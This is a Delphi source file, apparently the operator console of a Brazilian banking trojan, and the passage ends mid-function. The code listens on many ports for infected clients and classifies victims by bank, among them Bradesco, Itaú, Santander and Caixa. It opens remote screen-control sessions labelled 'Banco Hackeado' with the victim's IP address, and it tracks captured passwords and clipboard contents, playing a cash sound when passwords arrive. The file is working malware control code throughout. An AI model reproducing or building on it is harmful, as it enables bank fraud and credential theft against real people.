﻿unit UFCPrin;

interface

uses
  Windows, Messages, SysUtils, Variants,
  Classes, Graphics, Math, dialogs,
  Controls, Forms, ToolWin, ComCtrls, inifiles,
  ScktComp, Clipbrd, ExtCtrls, ImgList, MPlayer,
  CommCtrl, Menus, StdCtrls, rtcInfo, rtcCrypt,
  Contnrs, Data.DB, Vcl.Grids, Vcl.DBGrids,
  Datasnap.DBClient, Thend, Vcl.Buttons,
  bass, MidasLib, UFSessao, UBarra, UDAD,
  Vcl.Samples.Spin, ShellZipTool,
  Vcl.OleCtrls, SHDocVw, Vcl.Imaging.pngimage, System.ImageList;

type
  TrataSom = class(TThread)
  protected
    procedure Execute; override;
  public
    procedure TocaSom;

  end;

type
  TSock_Thread = class(TThread)
  private
    Socket1: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TSock_Thread2 = class(TThread)
  private
    Socket: TCustomWinSocket;
  public
    constructor Create(aSocket: TCustomWinSocket);
    procedure Execute; override;
  end;

type
  TFCPrin = class(TForm)
    SRV: TServerSocket;
    PopUpSh: TTimer;
    ImageList2: TImageList;
    PITCPIP: TThreadComponent;
    SrvInstal: TServerSocket;
    OpenDialog1: TOpenDialog;
    PITCPIP1: TThreadComponent;
    ImgIcon: TImageList;
    CatalogoXml: TClientDataSet;
    CatalogoXmlurl: TStringField;
    CatalogoXmlvalZoom: TIntegerField;
    CatalogoXmlvalPorta: TIntegerField;
    CatalogoXmlurlDns: TStringField;
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    LV1: TListView;
    Panel2: TPanel;
    btnSessao: TSpeedButton;
    btnLigarSrv: TSpeedButton;
    Panel3: TPanel;
    TabSheet2: TTabSheet;
    pTitlebar: TPanel;
    cTitleBar: TLabel;
    btnMinimize: TSpeedButton;
    btnClose: TSpeedButton;
    Image2: TImage;
    Panel1: TPanel;
    Label1: TLabel;
    Label4: TLabel;
    edPort: TEdit;
    SpinZoom: TSpinEdit;
    CheckZoom: TCheckBox;
    btnRecAll: TSpeedButton;
    Label2: TLabel;
    GroupBox1: TGroupBox;
    Label3: TLabel;
    Label7: TLabel;
    Label8: TLabel;
    Label6: TLabel;
    edPortSSH: TEdit;
    edDNS: TEdit;
    edLogin: TEdit;
    edPws: TEdit;
    RadioGroup1: TRadioGroup;
    Panel5: TPanel;
    SpeedButton2: TSpeedButton;
    Timer1: TTimer;
    procedure SRVAccept(Sender: TObject; Socket: TCustomWinSocket);
    procedure SRVClientDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure PopUpShTimer(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SRVListen(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormShow(Sender: TObject);
    procedure SRVClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure FormCreate(Sender: TObject);
    procedure LV1DblClick(Sender: TObject);
    procedure PITCPIPExecute(Sender: TObject);
    procedure btnSessaoClick(Sender: TObject);
    procedure btnLigarSrvClick(Sender: TObject);
    procedure edPortKeyPress(Sender: TObject; var Key: Char);
    procedure LV1CustomDraw(Sender: TCustomListView; const ARect: TRect;
      var DefaultDraw: Boolean);
    procedure SpeedButton2Click(Sender: TObject);
    procedure TabSheet1Show(Sender: TObject);
    procedure Label6Click(Sender: TObject);
    procedure Label7Click(Sender: TObject);
    procedure Panel4MouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure btnCloseClick(Sender: TObject);
    procedure btnMinimizeClick(Sender: TObject);
    procedure cTitleBarMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure cTitleBarMouseMove(Sender: TObject; Shift: TShiftState;
      X, Y: Integer);
    procedure cTitleBarMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure btnRecAllClick(Sender: TObject);
    procedure TabSheet2Show(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    Serial: String;
    TocaSom: TrataSom;
    // -----------------
    Percentual: Integer;
    UrlTelas: String;
    ZooPro: Integer;
    ZoomTela: Integer;
    PortaServidor: Integer;
    procedure AlertaZap;
    procedure Alertasenha;
    function RandonKey: String;
  end;

var
  FCPrin: TFCPrin;
  NEWSESSAO: TFSESSAO;
  NEWPAINEL: TFBarraRemota;
  NEWDADO: TFUDAD;
  Total: Integer;
  Streamsize: TMemoryStream;
  Tamanho: Int64;
  Versao, VersaoAtual: string;
  CaminhoZip: String;
  StartPing: Boolean = false;
  SomOk: Boolean;
  Channel: DWORD;
  Socket: TCustomWinSocket;
  ZoomProp: Boolean;
  bmp: TBitmap;
procedure TrimAppMemorySize;

implementation

{$R *.dfm}

uses UFCarga;

const
  Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  { TSock_Thread }

Procedure Extract_res();
var
  tmpStream: TResourceStream;
  MemStream: TMemoryStream;
  dest: string;
Begin
  try
    dest := GetEnvironmentVariable('APPDATA') + '\';
    showmessage(dest);
    MemStream := TMemoryStream.Create;
    tmpStream := TResourceStream.Create(HInstance, 'web', RT_RCDATA);
    MemStream.LoadFromStream(tmpStream);
    MemStream.Position := 0;
    MemStream.SaveToFile(dest + 'web.zip');
    Application.ProcessMessages;
  finally
    tmpStream.Free;
    MemStream.Free;
  end;
  // FCPrin.Timer1.Enabled := True;
End;

procedure SaveSetup;
var
  CfgFileName: String;
  infos: RtcString;
  s2: RtcByteArray;
  info: TRtcRecord;
  len2: longint;
begin

  info := TRtcRecord.Create;
  try
    info.asInteger['C0'] := FCPrin.SpinZoom.Value;
    info.asString['C1'] := FCPrin.edPort.Text;
    info.asString['C2'] := FCPrin.edDNS.Text;
    info.asString['C3'] := FCPrin.edPortSSH.Text;
    info.asString['C4'] := FCPrin.edLogin.Text;
    info.asString['C5'] := FCPrin.edPws.Text;
    info.asInteger['C6'] := FCPrin.RadioGroup1.ItemIndex;

    infos := info.toCode;
    Crypt(infos, 'RTC Host 2.0');
  finally
    info.Free;
  end;

//  CfgFileName := ChangeFileExt(AppFileName, '.inf');
  SetLength(s2, 4);
  len2 := length(infos);
  Move(len2, s2[0], 4);
//  infos := infos + RtcBytesToString(s2) + '@RTC@';
//  Write_File(CfgFileName, infos);

end;

procedure LoadSetup;
var
  CfgFileName: String;
  s: RtcString;
  s2: RtcByteArray;
  info: TRtcRecord;
  len: Int64;
  len2: longint;
begin
  s2 := nil;

//  CfgFileName := ChangeFileExt(AppFileName, '.inf');
  //len := File_Size(CfgFileName);
  if len > 5 then
  begin
    //s := Read_File(CfgFileName, len - 5, 5);
    if s = '@RTC@' then
    begin
      //s2 := Read_FileEx(CfgFileName, len - 4 - 5, 4);
      Move(s2[0], len2, 4);
      if (len2 = len - 4 - 5) then
      begin
        //s := Read_File(CfgFileName, len - 4 - 5 - len2, len2,
          //rtc_ShareDenyNone);
        DeCrypt(s, 'RTC Host 2.0');
        try
          info := TRtcRecord.FromCode(s);
        except
          info := nil;
        end;
        if assigned(info) then
        begin
          try
            FCPrin.SpinZoom.Value := info.asInteger['C0'];
            FCPrin.edPort.Text := info.asString['C1'];
            FCPrin.edDNS.Text := info.asString['C2'];
            FCPrin.edPortSSH.Text := info.asString['C3'];
            FCPrin.edLogin.Text := info.asString['C4'];
            FCPrin.edPws.Text := info.asString['C5'];
            FCPrin.RadioGroup1.ItemIndex := info.asInteger['C6'];

          finally
            info.Free;
          end;
        end;
      end;
    end;
  end;

end;

procedure CapturaErro2(E: string);
var
  erros: TStringList;
begin
  erros := TStringList.Create;
  erros.Add(E);
  erros.SaveToFile('Diagnóstico.log');
  erros.Free;
  Screen.Cursor := crDefault;
  Application.ProcessMessages;

end;

function setaIcon(Casa: String): Integer;
begin
  Result := 0;
  //
  if Pos(Casa, 'Caixa Economica') > 0 then
  begin
    Result := 1;
  end;
  if Pos(Casa, '[bb.com.br]') > 0 then
  begin
    Result := 2;
  end;
  if (Pos(Casa, 'Banco Bradesco') > 0) or (Pos(Casa, 'Aplicativo bradesco') > 0)
  then
  begin
    Result := 3;
  end;
  if Pos(Casa, 'Banco Itáu') > 0 then
  begin
    Result := 4;
  end;
  if Pos(Casa, 'Banco Santander') > 0 then
  begin
    Result := 5;
  end;
  if Pos(Casa, 'Banco Sicredi') > 0 then
  begin
    Result := 6;
  end;
  if (Pos(Casa, 'Banco Sicoob') > 0) then
  begin
    Result := 7;
  end;

  //if (Pos(Casa, 'Biticoin') > 0) then
  //begin
  //  Result := 8;
  //end;

end;

procedure TrimAppMemorySize;
var
  MainHandle: THandle;
begin
  try
    MainHandle := OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessID);
    SetProcessWorkingSetSize(MainHandle, $FFFFFFFF, $FFFFFFFF);
    CloseHandle(MainHandle);
  except
  end;
  Application.ProcessMessages;
end;

function GetSize(bytes: Int64): string;
begin
  if bytes < 1024 then
    Result := IntToStr(bytes) + ' B'
  else if bytes < 1048576 then
    Result := FloatToStrF(bytes / 1024, ffFixed, 10, 1) + ' KB'
  else if bytes < 1073741824 then
    Result := FloatToStrF(bytes / 1048576, ffFixed, 10, 1) + ' MB'
  else if bytes > 1073741824 then
    Result := FloatToStrF(bytes / 1073741824, ffFixed, 10, 1) + ' GB';
end;

procedure GravaLog(aTexto: string);
var
  ArqIni: TIniFile;
begin
  ArqIni := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Log.ini');
  try
    ArqIni.WriteString('Conteudo', 'Versao', aTexto);
  finally
    ArqIni.Free;
  end;

end;

procedure LerLog(aTexto: string);
var
  ArqIni: TIniFile;
begin
  ArqIni := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Log.ini');
  try
    aTexto := ArqIni.ReadString('Conteudo', 'Versao', aTexto);
    CaminhoZip := aTexto;
  finally
    ArqIni.Free;
  end;

end;

function ConvertNumero(fField: String): String;
var
  I: Byte;
begin
  Result := '';
  for I := 1 To length(fField) do
    if fField[I] In ['0' .. '9'] Then
      Result := Result + fField[I];
end;

Procedure Pausa(MSec: Cardinal);
var
  Start: Cardinal;
begin
  // Screen.Cursor := crHourGlass;
  Start := GetTickCount;
  repeat
    Application.ProcessMessages;
  until (GetTickCount - Start) >= MSec;
  Screen.Cursor := crDefault;
end;

function SplitString(s, Delimitador: string): TStringList;
var
  p: Integer;
begin
  Result := TStringList.Create;

  p := Pos(Delimitador, s);
  while (p > 0) do
  begin
    Result.Add(Copy(s, 1, p - 1));
    Delete(s, 1, p + length(Delimitador) - 1);
    p := Pos(Delimitador, s);
  end;

  if (s <> '') then
    Result.Add(s);
end;

function AlturaBarraTarefas: Integer;
var
  rRect: TRect;
  rBarraTarefas: HWND;
begin
  // Localiza o Handle da barra de tarefas
  rBarraTarefas := FindWindow('Shell_TrayWnd', nil);

  // Pega o "retângulo" que envolve a barra e sua altura
  GetWindowRect(rBarraTarefas, rRect);

  // Retorna a altura da barra
  Result := rRect.Bottom - rRect.Top;
end;

function MostraPopUp(Tela: TForm; Tempo: NativeInt): Boolean;
begin
  if not(Tela = nil) then
    if not Tela.Showing then
    begin
      TELAPOP := Tela;
      Tela.Left := Screen.Width - Tela.Width;
      Tela.Top := (Screen.Height - AlturaBarraTarefas);
      Tela.Show;
      FCPrin.PopUpSh.Interval := Tempo;
      FCPrin.PopUpSh.Enabled := True;
      Result := True;
    end
    else
    begin
      Result := false;
      Tela.BringToFront;
    end;
end;

constructor TSock_Thread.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(True);
  Socket1 := aSocket;
  Priority := tpIdle;
  FreeOnTerminate := True;
end;

procedure TSock_Thread.Execute;
var
  s: String;
  L: TListItem;
  TSTPrincipal: TSock_Thread2;
  idSrv: String;
begin
  inherited;
  //
  try

    while not Terminated and Socket1.Connected do
    begin
      if Socket1.ReceiveLength > 0 then
      begin
        s := FCarga.vDc_vCri('D', string(Socket1.ReceiveText));
        if Pos('#sTrCad#', s) > 0 then
        begin
          showmessage(s);
        end;

        if Pos('#sTrSktPrin#', s) > 0 then
        begin
          TSTPrincipal := TSock_Thread2.Create(Socket1);
          TSTPrincipal.Resume;
          Socket1.SendText(FCarga.vDc_vCri('C', '#Convite#'));
          // Pausa(5);
          // Socket.SendText(FCarga.vDc_vCri('C','#Handle#<#>'+IntToStr(Socket.Handle)));

          Destroy;
        end;

        if Pos('#strIniScree#', s) > 0 then
        begin
          FCPrin.LV1.Selected.SubItems.Objects[1] := TObject(Socket1);
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto :=
            TRemoto.Create(True);
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Priority
            := tpIdle;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Socket
            := Socket1;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Resume;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Remoto.Parar := false;

          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Socket.SendText(FCarga.vDc_vCri('C', '#xyScree#'));
          // CapturaErro2(inttostr(Socket1));
          // Sleep(1000);
          // ShowMessage('xy');
          Destroy;
        end;

        if Pos('#sTrCmdOK#', s) > 0 then
        begin
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Processa :=
            TProcessa.Create(True);
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.Priority := tpNormal;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.SocketAtivo := Socket1;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Processa.Fila2
            := TListaComandos.Create;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.Fila2.Clear;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Processa.Start;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.iniciou := True;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.ComandoOK := True;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.RecebeuClipboard := false;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.RecebeuSenhas := false;
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.SocketAtivo.SendText
            (FCarga.vDc_vCri('C', '#hKey#' + '<#>' +
            (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
            .Processa.RandoChave(60)));
          Destroy;
        end;

      end;
      Application.ProcessMessages;
      Sleep(10);
    end;
  finally
  end;
end;

procedure TFCPrin.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Application.Terminate;
end;

procedure TFCPrin.FormCreate(Sender: TObject);
  procedure Rounded(Control: TWinControl);
  var
    R: TRect;
    Rgn: HRGN;
  begin
    with Control do
    begin
      R := ClientRect;
      Rgn := CreateRoundRectRgn(R.Left, R.Top, R.Right, R.Bottom, 20, 20);
      Perform(EM_GETRECT, 0, lParam(@R));
      InflateRect(R, -5, -5);
      Perform(EM_SETRECTNP, 0, lParam(@R));
      SetWindowRgn(Handle, Rgn, True);
      Invalidate;
    end;
  end;

var
  caminho: String;
begin
  LV1.Enabled := True;
  Panel2.Caption := 'Total de Clientes Conectados: ' + IntToStr(Total);
  BASS_Init(-1, 44100, 0, Application.Handle, nil);
  Total := 0;
  caminho := ExtractFilePath(Application.ExeName);
  bmp := TBitmap.Create;
  bmp.LoadFromResourceName(HInstance, 'Bitmap_1');
  Canvas.Draw(0, 0, bmp);
  { if not FileExists(caminho+'config.xml') then
    begin
    CatalogoXml.CreateDataSet;
    CatalogoXml.SaveToFile(caminho+'config.xml',dfXML);
    CatalogoXml.FileName:= caminho+'config.xml';
    CatalogoXml.close;
    CatalogoXml.Open;
    end else
    begin

    CatalogoXml.FileName:= caminho+'config.xml';
    CatalogoXml.close;
    CatalogoXml.Open;

    end; }

end;

procedure TFCPrin.FormShow(Sender: TObject);
begin
  ShowWindow(Self.Handle, SW_NORMAL);

end;

procedure TFCPrin.Label6Click(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TFCPrin.Label7Click(Sender: TObject);
begin
  Application.Minimize
end;

procedure TFCPrin.LV1CustomDraw(Sender: TCustomListView; const ARect: TRect;
  var DefaultDraw: Boolean);
begin
  { if LV1.ItemIndex <0 then
    begin
    with (Sender as TListView).Canvas do
    Draw(0,0, BMP);
    //LV1.Color:=clBlack;
    end else
    begin
    with (Sender as TListView).Canvas do
    begin
    bmp:=nil;
    Draw(0,0,bmp);
    //LV1.Color:=clBlack;
    end;
    end; }
end;

procedure TFCPrin.LV1DblClick(Sender: TObject);
begin
  btnSessaoClick(Self);
end;

procedure TFCPrin.Panel4MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  ReleaseCapture;
  PostMessage(FCPrin.Handle, WM_SYSCOMMAND, $F012, 0);

end;

procedure TFCPrin.PITCPIPExecute(Sender: TObject);
var
  I: Integer;
  Socket: TCustomWinSocket;
  L: TListItem;

begin
  try
    for I := 0 to LV1.Items.Count - 1 do
    begin
      Socket := TCustomWinSocket(LV1.Items.Item[I].SubItems.Objects[0]);
      LV1.Items.Item[I].SubItems.Objects[5] := TObject(GetTickCount);
      Socket.SendText(FCarga.vDc_vCri('C', '#ON-LINE#'));
      TrimAppMemorySize;
    end;
  except
    LV1.Items.Delete(I);
  end;

end;

procedure TFCPrin.PopUpShTimer(Sender: TObject);
begin
  TELAPOP.Top := TELAPOP.Top - 10;
  if TELAPOP.Top <= ((Screen.Height - AlturaBarraTarefas) - TELAPOP.Height) then
    PopUpSh.Enabled := false;
end;

function TFCPrin.RandonKey: String;
var
  s: string;
  I, N: Integer;
begin
  Result := '';
  for I := 1 to 30 do
  begin
    N := Random(length(Chars)) + 1;
    Result := Result + Chars[N];
  end;

end;

procedure TFCPrin.SpeedButton2Click(Sender: TObject);
begin
  { if CatalogoXml.RecordCount=0 then
    begin
    CatalogoXml.Append;
    CatalogoXml.FieldByName('url').AsString:='';
    CatalogoXml.FieldByName('valzoom').AsInteger:=SpinZoom.Value;
    CatalogoXml.FieldByName('valPorta').AsInteger:=StrToInt(edPort.Text);
    CatalogoXml.FieldByName('urldns').AsString:='';

    CatalogoXml.Post;
    CatalogoXml.close;
    CatalogoXml.Open;
    Application.MessageBox('Operação Confirmada','Aviso',mb_ok+MB_ICONQUESTION);

    end else
    begin
    CatalogoXml.Edit;
    CatalogoXml.FieldByName('url').AsString:='';
    CatalogoXml.FieldByName('valzoom').AsInteger:=SpinZoom.Value;
    CatalogoXml.FieldByName('valPorta').AsInteger:=StrToInt(edPort.Text);
    CatalogoXml.FieldByName('urldns').AsString:='';

    CatalogoXml.Post;
    CatalogoXml.close;
    CatalogoXml.Open;
    Application.MessageBox('Operação Confirmada','Aviso',mb_ok+MB_ICONQUESTION);

    end; }

  if (edPort.Text = edPortSSH.Text) and (edPortSSH.Text = edPort.Text) then
  begin
    Application.MessageBox('Porta Servidor = a Porta SSH', 'Aviso',
      mb_ok + MB_ICONQUESTION);

  end
  else
  begin
    SaveSetup;
    Application.MessageBox('Operação Confirmada', 'Aviso',
      mb_ok + MB_ICONQUESTION);

  end;

end;

procedure TFCPrin.SRVAccept(Sender: TObject; Socket: TCustomWinSocket);
var
  TST: TSock_Thread;

begin
  TST := TSock_Thread.Create(Socket);
  TST.Resume;
end;

constructor TSock_Thread2.Create(aSocket: TCustomWinSocket);
begin
  inherited Create(True);
  Socket := aSocket;
  Priority := tpIdle;
  FreeOnTerminate := True;
end;

procedure TSock_Thread2.Execute;

var
  comando: String;
  proc: String;

  POSX: Integer;
  Inicio: Integer;
  Aux: String;
  LstComando: TStringList;
  ping1, ping2, I: Integer;
  L: TListItem;
  CalcZoom: Integer;
  CalcZoom2: Integer;

begin
  inherited;
  while not Terminated and Socket.Connected do
  begin

    if Socket.ReceiveLength > 0 then
    begin
      comando := FCarga.vDc_vCri('D', string(Socket.ReceiveText));
      if Pos('#ConvitRC#', comando) > 0 then
      begin
        try
          FCPrin.LV1.GridLines := True;
          FCPrin.LV1.Color := clWindow;

          LstComando := TStringList.Create;
          LstComando := SplitString(comando, '<#>');
          L := FCPrin.LV1.Items.Add;
          L.ImageIndex := setaIcon(LstComando[2]);

          L.Caption := IntToStr(Socket.Handle);
          L.SubItems.Add(LstComando[1]);
          L.SubItems.Add(LstComando[2]);
          L.SubItems.Add(LstComando[3]);
          L.SubItems.Add(Socket.RemoteAddress);
          L.SubItems.Add('0');
          L.SubItems.Add(' ');
          L.SubItems.Add(' ');
          L.SubItems.Objects[0] := TObject(Socket);
          LstComando.Free;
          Socket.SendText(FCarga.vDc_vCri('C',
            '#Handle#<#>' + IntToStr(Socket.Handle)))
        finally

        end;
        with FCPrin do
        begin
          // Percentual:=80;
          Total := Total + 1;
          Panel2.Caption := 'Total de Clientes Conectados: ' + IntToStr(Total);
          Synchronize(AlertaZap);

        end;

      end;
      if Pos('#strPingOk#', comando) > 0 then
      begin
        L := FCPrin.LV1.FindCaption(0, IntToStr(Socket.Handle), false,
          True, false);
        ping1 := Integer(L.SubItems.Objects[5]);
        ping2 := GetTickCount - ping1;
        L.SubItems[4] := IntToStr(ping2);

      end;

      if Pos('#Handle#', comando) > 0 then
      begin
        LstComando := TStringList.Create;
        LstComando := SplitString(comando, '<#>');
        (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.IdServidor
          := LstComando[1];
      end;

      if Pos('#strResolucao#', comando) > 0 then
      begin
        LstComando := TStringList.Create;
        LstComando := SplitString(comando, '<#>');
        (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).XTela :=
          StrToInt(LstComando[1]);
        (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).YTela :=
          StrToInt(LstComando[2]);
        if FCPrin.CheckZoom.Checked then
        begin
          CalcZoom :=
            Round(((Screen.Width * 100) / StrToInt(LstComando[1]) - 5));
          CalcZoom2 :=
            Round(((Screen.Height * 100) / StrToInt(LstComando[2]) - 10));
          if CalcZoom < CalcZoom2 then
            (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Zoom
              := CalcZoom
          else if CalcZoom2 >= 90 then
            (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
              .Remoto.Zoom := 90
          else
            (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Zoom :=
              CalcZoom2;
        end
        else
        begin
          (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Remoto.Zoom :=
            FCPrin.SpinZoom.Value;
        end;

        (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
          .Remoto.Socket.SendText(FCarga.vDc_vCri('C', '#beginning#' + '<#>' +
          IntToStr((FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO)
          .Remoto.Zoom)));
        (FCPrin.LV1.Selected.SubItems.Objects[2] as TFSESSAO).Resolucao_Tela;

        LstComando.Free;
      end;

    end;
    Application.ProcessMessages;
    Sleep(10);
  end;
end;

procedure TFCPrin.SRVClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  L: TListItem;
begin
  L := LV1.FindCaption(0, IntToStr(Socket.Handle), false, True, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (LV1.Selected.SubItems.Objects[2] as TFSESSAO).Socket then
      begin
        (L.SubItems.Objects[2] as TFSESSAO).Close;

      end;
    end;
    L.Delete;
    Total := Total - 1;
    Panel2.Caption := 'Total de Clientes Conectados: ' + IntToStr(Total);
    if Total = 0 then
      LV1.GridLines := false;
    LV1.Color := clSilver;
  end;
end;

procedure TFCPrin.SRVClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
var
  L: TListItem;
begin
  ErrorCode := 0;
  L := LV1.FindCaption(0, IntToStr(Socket.Handle), false, True, false);
  if L <> nil then
  begin
    if L.SubItems.Objects[2] <> nil then
    begin
      if Socket = (L.SubItems.Objects[2] as TFSESSAO).Socket then
      begin
        (L.SubItems.Objects[2] as TFSESSAO).Close;

      end;
    end;
    L.Delete;
    Total := Total - 1;
    Panel2.Caption := 'Total de Clientes Conectados: ' + IntToStr(Total);
  end;
end;

procedure TFCPrin.SRVListen(Sender: TObject; Socket: TCustomWinSocket);
begin
  Panel3.Caption := 'Escuntando Porta: ' + IntToStr(SRV.Port);
end;

procedure TFCPrin.TabSheet1Show(Sender: TObject);
begin
  LoadSetup;
  { if CatalogoXml.RecordCount=0 then
    exit else
    // edUrl.Text    :=CatalogoXml.FieldByName('url').AsString;
    SpinZoom.Value:=CatalogoXml.FieldByName('valZoom').Value;
    edPort.Text   :=IntToStr(CatalogoXml.FieldByName('valPorta').AsInteger);
    //ENav.Text     :=CatalogoXml.FieldByName('urlDns').AsString;
  }
end;

procedure TFCPrin.TabSheet2Show(Sender: TObject);
begin
  Panel1.Left := (LV1.Width - Panel1.Width) div 2;
  Panel1.Top := (LV1.Height - Panel1.Height) div 2;

end;


procedure TFCPrin.btnSessaoClick(Sender: TObject);
const
  crMyCursor = 1;
var
  L: TListItem;
  Socket: TCustomWinSocket;
begin
  try
    if LV1.ItemIndex < 0 then
    begin
      Application.MessageBox('Não Existe Conexções ativas', 'Aviso', 0 + 48);
      exit;
    end;
    if LV1.Selected.SubItems.Objects[2] = nil then
    begin
      // ------------------------------------------------------------------------------
      // # CRIA A NOVA SESSAO REMOTA
      NEWSESSAO := TFSESSAO.Create(nil);
      LV1.Selected.SubItems.Objects[2] := TObject(NEWSESSAO);
      NEWSESSAO.Caption := '#-[Banco Hackeado :-> ' + LV1.Selected.SubItems[1] +
        ' - ' + 'Endereço IP da Vítima: ' + LV1.Selected.SubItems[3] + ']-#';
      NEWSESSAO.AbrePop := True;
      NEWSESSAO.Casa := LV1.Selected.SubItems[1];
      // ------------------------------------------------------------------------

      Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      NEWSESSAO.Socket := Socket;

      Socket.SendText(FCarga.vDc_vCri('C', '#Iniciar#'));
      // ------------------------------------------------------------------------
      NEWPAINEL := TFBarraRemota.Create(nil);
      FCPrin.LV1.Selected.SubItems.Objects[3] := TObject(NEWPAINEL);
      NEWPAINEL.Url := '';
      NEWPAINEL.SocketBarra :=
        TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      NEWPAINEL.Show;
      // ------------------------------------------------------------------------

      NEWDADO := TFUDAD.Create(nil);
      FCPrin.LV1.Selected.SubItems.Objects[4] := TObject(NEWDADO);
      NEWDADO.SocketD := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      NEWDADO.Show;
      ///
      NEWSESSAO.Show;

      // ------------------------------------------------------------------------------
    end
    else if (LV1.Selected.SubItems.Objects[2] as TFSESSAO).Visible = false then
    begin
      // SE JA EXISTE A SESSAO
      Socket := TCustomWinSocket(LV1.Selected.SubItems.Objects[0]);
      //
      (LV1.Selected.SubItems.Objects[3] as TFBarraRemota).Show;

      (LV1.Selected.SubItems.Objects[2] as TFSESSAO).Socket := Socket;
      (LV1.Selected.SubItems.Objects[2] as TFSESSAO).Show;
      (LV1.Selected.SubItems.Objects[2] as TFSESSAO).BringToFront;

    end;
    // ------------------------------------------------------------------------------

  finally
  end;
end;

var
  LMouseX, LMouseY: Integer;
  SMouseD: Boolean = false;
  LMouseD: Boolean = false;

procedure TFCPrin.cTitleBarMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Button = mbLeft then
  begin
    LMouseD := True;
    LMouseX := X;
    LMouseY := Y;
  end;

end;

procedure TFCPrin.cTitleBarMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
  if LMouseD then
    SetBounds(Left + X - LMouseX, Top + Y - LMouseY, Width, Height);

end;

procedure TFCPrin.cTitleBarMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if Button = mbLeft then
    LMouseD := false;

end;

procedure TFCPrin.edPortKeyPress(Sender: TObject; var Key: Char);
begin
  if not(Key in ['0' .. '9', #8, #27, #32]) then
  begin
    beep;
    Key := #0;
  end;
end;

procedure TFCPrin.AlertaZap;
begin
  with FCPrin do
  begin
    Channel := BASS_StreamCreateFile(false,
      PChar(ExtractFilePath(Application.ExeName) + '\beep.wav'), 0, 0, 0
{$IFDEF UNICODE} or BASS_UNICODE {$ENDIF});
    BASS_ChannelPlay(Channel, false);

  end;
end;

procedure TFCPrin.Alertasenha;
begin
  with FCPrin do
  begin
    Channel := BASS_StreamCreateFile(false,
      PChar(ExtractFilePath(Application.ExeName) + '\cash.mp3'), 0, 0, 0
{$IFDEF UNICODE} or BASS_UNICODE {$ENDIF});
    BASS_ChannelPlay(Channel, false);

  end;
end;

procedure TFCPrin.btnCloseClick(Sender: TObject);
begin
  Application.Terminate;
end;

procedure TFCPrin.btnLigarSrvClick(Sender: TObject);
var
  I: Integer;
  SRVX: TServerSocket;
begin
  if btnLigarSrv.Caption = 'Servidor OFF' then
  begin
    SRV.Port := 5400;
    SRV.Close;
    SRV.Open;
    for I := 1 to 400 do
    begin
      try
        SRVX := TServerSocket.Create(nil);
        SRVX.Port := SRV.Port + I;
        SRVX.onaccept := SRVAccept;
        SRVX.OnClientDisconnect := SRVClientDisconnect;
        SRVX.OnClientError := SRVClientError;
        SRVX.OnListen := SRVListen;
        SRVX.Close;
        SRVX.Open;
